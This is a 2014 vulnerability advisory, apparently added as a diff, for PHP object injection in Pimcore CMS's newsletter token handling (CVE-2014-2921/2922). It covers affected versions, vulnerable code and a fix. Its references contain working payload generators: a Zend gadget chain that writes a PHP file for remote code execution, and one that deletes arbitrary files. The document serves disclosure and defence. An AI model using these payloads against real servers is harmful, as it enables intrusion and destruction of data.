@@ -1,0 +1,202 @@
+> Vulnerabilities in Pimcore 1.4.9 to 2.1.0 (inclusive)
+> Discovered by Pedro Ribeiro (pedrib@gmail.com) of Agile Information Security
+====================================================================
+Disclosure: 14/04/2014 / Last updated: 12/10/2014
+
+Vulnerability: Remote code execution in Pimcore CMS via unserialize() PHP object injection (CVE-2014-2921)
+Vulnerability: Arbitrary file deletion in Pimcore CMS via unserialize() PHP object injection (CVE-2014-2922)
+File(line): pimcore/lib/Pimcore/Tool/Newsletter.php(221)
+
+Summary:
+This vulnerability can be exploited by sending a base64 encoded payload as the "token" parameter to the newsletter unsubscribe page of the target site. Payload [1] abuses several Zend classes to achieve remote code execution (based on Stefan Esser's technique in [2] and Egidio Romano's exploit code from [3]). Payload [4] abuses Zend_Http_Response_Stream to delete a file in /tmp/deleteme and works in all PHP versions.
+
+Versions affected:
+1.4.9 to 1.4.10 (inclusive) / 2.0.0 (possibly): Remote code execution (when server is running PHP <= 5.3.3). 
+1.4.9 to 2.1.0 (inclusive): Arbitrary file deletion (any PHP version), POSSIBLY remote code execution.
+Version 2.2.0 or higher resolves this vulnerability.
+
+Due to changes introduced in PHP 5.3.4 to reject file names with null bytes, payload [3] does not work on Pimcore versions between 2.0.1 and 2.1.0 as Pimcore enforces a PHP 5.4 requirement. Version 2.0.0 might be vulnerable if anyone is running it on PHP versions <= 5.3.3... which according to the developers is not possible, but the requirement was only enforced in 2.0.1.
+Note that however the underlying vulnerability for both the remote code execution and the arbitrary file deletion is the same (unserialize() object injection), so it might be possible to execute code if any other Zend PHP POP chains are found in the future.
+
+
+Fix for vulnerability:
+https://github.com/pimcore/pimcore/commit/3cb2683e669b5644f180d362cfa9614c09bef280
+
+
+Newsletter.php added to repository on February 25th 2013 (was released in 1.4.9 on 02/Mar/13):
+https://github.com/pimcore/pimcore/commit/db18317af47de1de9f9ec6d83db1c2d353d06db7
+
+
+PHP 5.4 requirement introduced on October 31st 2013 (was released in 2.0.1 on 20/Dec/13):
+https://github.com/pimcore/pimcore/commit/ee56ac2c1f7c9dc6e1617023fc766ea9c67e601b
+
+
+Code snippets:
+
+pimcore/lib/Pimcore/Tool/Newsletter.php(221):
+
+    public function getObjectByToken($token) {
+        $data = unserialize(base64_decode($token));
+        if($data) {
+            if($object = Object_Abstract::getById($data["id"])) {
+
+                if($version = $object->getLatestVersion()) {
+                    $object = $version->getData();
+                }
+
+
+This function is called in the same file in confirm() and unsubscribeByToken():
+    public function confirm($token) {
+
+        $object = $this->getObjectByToken($token);
+        if($object) {
+
+
+    public function unsubscribeByToken ($token) {
+
+        $object = $this->getObjectByToken($token);
+        if($object) {
+
+
+In the Pimcore Wiki[5] and sample site[6], users are shown how to use the token parameter and encourage you to take the sample code and modify it.
+The sample code passes the token directly without any validation in confirmAction():
+    public function confirmAction() {
+
+        $this->enableLayout();
+
+        $this->view->success = false;
+
+        $newsletter = new Pimcore_Tool_Newsletter("person"); // replace "crm" with the class name you have used for your class above (mailing list)
+
+        if($newsletter->confirm($this->getParam("token"))) {
+            $this->view->success = true;
+        }
+
+
+And also in unsubscribeAction():
+    public function unsubscribeAction() {
+
+        $this->enableLayout();
+
+        $newsletter = new Pimcore_Tool_Newsletter("person"); // replace "crm" with the class name you have used for your class above (mailing list)
+
+        $unsubscribeMethod = null;
+        $success = false;
+
+        if($this->getParam("email")) {
+            $unsubscribeMethod = "email";
+            $success = $newsletter->unsubscribeByEmail($this->getParam("email"));
+        }
+
+        if($this->getParam("token")) {
+            $unsubscribeMethod = "token";
+            $success = $newsletter->unsubscribeByToken($this->getParam("token"));
+        }
+
+
+Mitigation:
+Do not pass untrusted input into the unserialize function. Use JSON encoding / decoding instead of unserialize. This was introduced in commit 3cb2683e669 and released in version 2.2.0.
+
+References:
+========================================================
+[1] Remote code execution, PHP <= 5.3.3, original code from [3] (Egidio Romano)
+<?php
+
+class Zend_Search_Lucene_Index_FieldInfo
+{
+    public $name = '<?php phpinfo(); die;?>';
+}
+ 
+class Zend_Search_Lucene_Storage_Directory_Filesystem
+{
+    protected $_dirPath = null;
+     
+    public function __construct($path)
+    {
+        $this->_dirPath = $path;
+    }
+}
+ 
+interface Zend_Pdf_ElementFactory_Interface {}
+ 
+class Zend_Search_Lucene_Index_SegmentWriter_StreamWriter implements Zend_Pdf_ElementFactory_Interface
+{
+    protected $_docCount = 1;
+    protected $_name = 'foo';
+    protected $_directory;
+    protected $_fields;
+    protected $_files;
+     
+    public function __construct($directory, $fields)
+    {
+        $this->_directory = $directory;
+        $this->_fields    = array($fields);
+        $this->_files     = new stdClass;
+    }
+}    
+ 
+class Zend_Pdf_ElementFactory_Proxy
+{
+    private $_factory;
+     
+    public function __construct(Zend_Pdf_ElementFactory_Interface $factory)
+    {
+        $this->_factory = $factory;
+    }
+}
+ 
+// This null byte technique only works in PHP <= 5.3.3
+$directory = new Zend_Search_Lucene_Storage_Directory_Filesystem("/var/www/malicious.php\0");
+$__factory = new Zend_Search_Lucene_Index_SegmentWriter_StreamWriter($directory, new Zend_Search_Lucene_Index_FieldInfo);
+$____proxy = new Zend_Pdf_ElementFactory_Proxy($__factory);
+ 
+echo base64_encode(serialize($____proxy));
+
+?>
+
+========================================================
+[2] http://www.suspekt.org/downloads/POC2009-ShockingNewsInPHPExploitation.pdf
+[3] http://www.exploit-db.com/exploits/19573
+========================================================
+[4] Arbitrary file deletion, all PHP versions
+<?php
+class Zend_Http_Response_Stream 
+{
+    protected $stream;
+    protected $stream_name;
+    protected $_cleanup;
+    public function setStream($stream)
+    {
+        $this->stream = $stream;
+        return $this;
+    }
+    public function setCleanup($cleanup = true) {
+        $this->_cleanup = $cleanup;
+    }
+    public function setStreamName($stream_name) {
+        $this->stream_name = $stream_name;
+        return $this;
+    }
+}
+$resp = new Zend_Http_Response_Stream();
+$resp->setStream(null);
+$resp->setCleanup();
+$resp->setStreamName("/tmp/deleteme");
+
+echo base64_encode(serialize($resp));
+?>
+
+========================================================
+[5] http://www.pimcore.org/wiki/display/PIMCORE/Newsletter
+[6] Downloadable from the Pimcore website (https://www.pimcore.org/download/pimcore-data.zip). The file mentioned is website/controllers/NewsletterController.php.
+
+Other references:
+https://www.owasp.org/index.php/PHP_Object_Injection
+http://www.alertlogic.com/writing-exploits-for-exotic-bug-classes/
+http://vagosec.org/2013/12/wordpress-rce-exploit/
+
+
+================
+Agile Information Security Limited
+http://www.agileinfosec.co.uk/
+>> Enabling secure digital business >>
